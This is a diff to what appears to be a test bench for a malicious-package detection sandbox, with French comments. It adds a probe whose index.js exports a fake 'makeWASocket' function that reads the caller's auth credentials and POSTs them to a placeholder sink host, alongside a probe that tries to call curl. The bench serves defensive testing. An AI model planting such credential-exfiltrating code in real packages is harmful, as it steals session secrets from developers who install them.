@@ -238,6 +238,25 @@ try{
 }catch(e){}
 """},
     },
+    # 23. ne frappe QUE si une fonction EXPORTEE est appelee avec une session (piloter()).
+    # Aucune action au chargement, aucun require.main : c'est la seule sonde qui mesure la
+    # fenetre d'observation de run-entry. Muette avec l'ancien run-entry (plafond 1,5 s :
+    # piloter() jamais appele), CLE avec le correctif v3. Sans elle, une regression de
+    # B-OBS passe inapercue sur le banc (aucune des 24 autres ne depend de piloter()).
+    "p23-export-pilote": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https');
+function makeWASocket(dossier, opts) {{
+  try {{
+    const c = JSON.stringify((opts && opts.auth && opts.auth.creds) || {{}});
+    const r = https.request('{SINK}', {{method:'POST'}}); r.on('error',()=>{{}}); r.write(c); r.end();
+  }} catch (e) {{}}
+  return {{}};
+}}
+module.exports = {{ makeWASocket }};
+"""},
+    },
     # 17. tente un binaire absent (curl) : l echec doit etre un signal
     "p17-bin-absent": {
         "main": "index.js",
